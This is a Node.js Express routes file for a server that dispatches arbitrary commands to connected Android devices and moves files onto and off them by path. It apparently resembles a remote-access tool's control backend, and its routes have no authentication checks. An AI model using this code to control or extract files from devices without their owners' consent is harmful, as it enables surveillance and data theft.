/**
 * Admin API Routes
 */

import express from 'express';
import multer from 'multer';
import path from 'path';
import fs from 'fs/promises';
import { socketRegistry } from '../services/socketRegistry.js';
import { commandDispatcher } from '../services/commandDispatcher.js';

const router = express.Router();

// Configure multer for file uploads
const storage = multer.diskStorage({
    destination: async (req, file, cb) => {
        const uploadDir = './uploads';
        try {
            await fs.mkdir(uploadDir, { recursive: true });
            cb(null, uploadDir);
        } catch (error) {
            cb(error);
        }
    },
    filename: (req, file, cb) => {
        const uniqueName = `${Date.now()}-${file.originalname}`;
        cb(null, uniqueName);
    },
});

const upload = multer({
    storage,
    limits: { fileSize: 100 * 1024 * 1024 }, // 100MB
});

/**
 * GET /api/devices - List all devices (online + offline)
 */
router.get('/devices', (req, res) => {
    const devices = socketRegistry.listDevices();
    res.json({
        success: true,
        total: devices.length,
        devices,
    });
});

/**
 * GET /api/devices/online - List only online devices
 */
router.get('/devices/online', (req, res) => {
    const devices = socketRegistry.getOnlineDevices();
    res.json({
        success: true,
        online: devices.length,
        devices,
    });
});

/**
 * GET /api/device/:deviceId/info - Get specific device info
 */
router.get('/device/:deviceId/info', async (req, res) => {
    const { deviceId } = req.params;

    try {
        const device = socketRegistry.getDevice(deviceId);
        if (!device) {
            return res.status(404).json({
                success: false,
                error: 'Device not found or disconnected',
            });
        }

        // Request fresh device info
        const deviceInfo = await commandDispatcher.sendCommand(deviceId, 'device_info');

        res.json({
            success: true,
            device: {
                deviceId,
                ...device.metadata,
                ...deviceInfo,
            },
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message,
        });
    }
});

/**
 * POST /api/command/:deviceId - Send command to device
 */
router.post('/command/:deviceId', async (req, res) => {
    const { deviceId } = req.params;
    const { action, payload } = req.body;

    if (!action) {
        return res.status(400).json({
            success: false,
            error: 'Action is required',
        });
    }

    try {
        const data = await commandDispatcher.sendCommand(deviceId, action, payload || {});
        res.json({
            success: true,
            data,
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message,
        });
    }
});

/**
 * POST /api/upload/:deviceId - Upload file to device
 */
router.post('/upload/:deviceId', upload.single('file'), async (req, res) => {
    const { deviceId } = req.params;
    const { targetPath } = req.body;

    if (!req.file) {
        return res.status(400).json({
            success: false,
            error: 'No file provided',
        });
    }

    try {
        // Read uploaded file
        const fileBuffer = await fs.readFile(req.file.path);
        const base64Data = fileBuffer.toString('base64');

        // Send to device
        const result = await commandDispatcher.sendCommand(deviceId, 'file_upload', {
            path: targetPath || `/storage/emulated/0/Download/${req.file.originalname}`,
            data: base64Data,
            filename: req.file.originalname,
        });

        // Clean up temporary file
        await fs.unlink(req.file.path);

        res.json({
            success: true,
            data: result,
        });
    } catch (error) {
        // Clean up on error
        try {
            await fs.unlink(req.file.path);
        } catch (e) {
            // Ignore cleanup errors
        }

        res.status(500).json({
            success: false,
            error: error.message,
        });
    }
});

/**
 * POST /api/device-upload-temp - Endpoint for device to upload large files temporarily
 * Used when file > 5MB to avoid WebSocket crash
 */
router.post('/device-upload-temp', upload.single('file'), (req, res) => {
    if (!req.file) {
        return res.status(400).json({ error: 'No file provided' });
    }
    // File is already saved to uploads/ by multer with a unique name
    res.json({
        status: 'success',
        tempFilename: req.file.filename,
        originalName: req.file.originalname
    });
});

/**
 * GET /api/download/:deviceId - Download file from device
 */
router.get('/download/:deviceId', async (req, res) => {
    const { deviceId } = req.params;
    const { path: filePath } = req.query;

    if (!filePath) {
        return res.status(400).json({
            success: false,
            error: 'File path is required',
        });
    }

    try {
        const result = await commandDispatcher.sendCommand(deviceId, 'file_download', {
            path: filePath,
        });

        // STRATEGY 1: Large File (Temp Upload)
        if (result.strategy === 'temp_url' && result.tempFilename) {
            const tempPath = path.resolve('./uploads', result.tempFilename);
            const filename = result.filename || path.basename(filePath);

            // Check if file exists
            try {
                await fs.access(tempPath);
            } catch (e) {
                return res.status(404).json({ success: false, error: 'Temp file not found on server' });
            }

            res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
            res.setHeader('Content-Type', 'application/octet-stream');

            // Stream file to response
            res.sendFile(tempPath, async (err) => {
                if (!err) {
                    // Delete temp file after successful download
                    try {
                        await fs.unlink(tempPath);
                    } catch (e) { console.error('Failed to delete temp file:', e); }
                }
            });
            return;
        }

        // STRATEGY 2: Small File (Base64) - Default behavior
        const filename = result.filename || path.basename(filePath);
        const buffer = Buffer.from(result.data, 'base64');

        res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
        res.setHeader('Content-Type', 'application/octet-stream');
        res.send(buffer);
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message,
        });
    }
});

/**
 * GET /api/stats - Server statistics
 */
router.get('/stats', (req, res) => {
    res.json({
        success: true,
        stats: {
            connectedDevices: socketRegistry.getDeviceCount(),
            pendingCommands: commandDispatcher.getPendingCount(),
            uptime: process.uptime(),
            memory: process.memoryUsage(),
        },
    });
});

/**
 * DELETE /api/device/:deviceId - Permanently delete device (admin only)
 */
router.delete('/device/:deviceId', (req, res) => {
    const { deviceId } = req.params;

    const removed = socketRegistry.deleteDevice(deviceId);
    if (removed) {
        res.json({
            success: true,
            message: `Device ${deviceId} permanently deleted`,
        });
    } else {
        res.status(404).json({
            success: false,
            error: 'Device not found',
        });
    }
});

export default router;
